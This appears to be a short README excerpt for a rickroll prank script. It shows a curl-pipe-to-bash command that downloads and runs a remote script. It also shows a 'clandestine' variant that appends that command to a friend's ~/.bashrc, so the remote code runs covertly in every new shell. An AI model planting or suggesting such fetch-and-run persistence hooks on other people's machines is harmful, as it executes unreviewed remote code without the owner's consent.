...
To start rickrollin’ immediately:
    ...
    curl -s -L https://raw.githubusercontent.com/Bruce20090827/rickrollrc/master/roll.sh | bash

Here is the clandestine command you can give to your friends 😈(WTF?)
...
Which essentially just does:
    ...
    echo "curl -s -L https://raw.githubusercontent.com/Bruce20090827/rickrollrc/master/roll.sh | bash" >> ~/.bashrc
